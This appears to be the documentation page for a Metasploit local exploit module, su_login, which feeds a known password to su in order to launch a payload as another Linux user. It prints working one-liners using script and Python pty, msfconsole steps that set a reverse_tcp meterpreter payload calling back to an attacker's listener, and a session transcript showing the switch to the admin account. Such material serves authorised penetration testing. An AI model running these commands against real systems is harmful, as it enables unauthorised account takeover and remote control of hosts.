## Description

  This module attempts to create a new login session by invoking the su command of a valid username and 
  password. If the login is successful, a new session is created via the specified payload. While this 
  functionality can be reproduced by a TTY shell, a hacker might want to switch users with a meterpreter 
  session, or simply have all of their shells managed in one place.

  The su command is used in Linux and Unix environments to change to another user in Linux. We can use this
  command to launch our payload as another user by running `su - [username] -c [payload]`. However, because
  you cannot pass in the password into su directly, we have to get a little more crafty. By running a command
  in sh, we can pipe the output to our su command (kind of) by using the following command:
  `sh -c 'sleep 1; echo [password]' | script /dev/null -qc 'su - [username] -c [payload]'`.

  Working example: `sh -c 'sleep 1; echo lamepassword' | script /dev/null -qc 'su - admin -c /tmp/shell'`

  In order for the above example to work, the `script` command must be apart of the `util-linux` version 2.26+ 
  package. If this is not the case, this module can attempt to use Python's `pty` library.

  Working example: `python -c "import os, pty, base64; os.close(0); pty.spawn('su - admin -c /tmp/shell'.split(), lambda fd: os.read(fd, 1024), lambda fd: 'lamepassword')"`

## Verification Steps

  1. Start `msfconsole`
  2. Get a session
  3. Get valid target username and password
  4. Do: `use exploit/linux/local/su_login`
  5. Do: `set SESSION [SESSION]`
  6. Do: `set USERNAME [USERNAME]`
  7. Do: `set PASSWORD [PASSWORD]`
  8. Do: `set PAYLOAD linux/x86/meterpreter/reverse_tcp`
  9. Do: `set LHOST [LHOST]`
  10. Do: `set LPORT [LPORT]`
  11. Do: `run`
  12. You should get a new session as the specified user

## Options

  ### USERNAME
  The username of the user to switch to
  
  ### PASSWORD
  The password of the user to switch to

## Scenarios

  ```
  meterpreter > getuid
  Server username: tester @ edf3515e4c8f (uid=1000, gid=1000, euid=1000, egid=1000)
  meterpreter > background
  [*] Backgrounding session 1...  

  msf > use exploit/linux/local/su_login 
  msf exploit(linux/local/su_login) > set SESSION 1
  msf exploit(linux/local/su_login) > set USERNAME admin
  msf exploit(linux/local/su_login) > set PASSWORD lamepassword
  msf exploit(linux/local/su_login) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
  msf exploit(linux/local/su_login) > set LHOST 192.168.3.193
  msf exploit(linux/local/su_login) > set LPORT 4445
  msf exploit(linux/local/su_login) > run

  [*] Started reverse TCP handler on 192.168.3.193:4445 
  [*] Uploading payload to target
  [*] Attempting to login with su
  [*] Sending stage (976712 bytes) to 172.17.0.2
  [*] Meterpreter session 2 opened (192.168.3.193:4445 -> 172.17.0.2:39868) at 2020-09-23 04:26:49 -0400

  meterpreter > getuid
  Server username: admin @ 59f089909a39 (uid=1001, gid=1001, euid=1001, egid=1001)
  ```
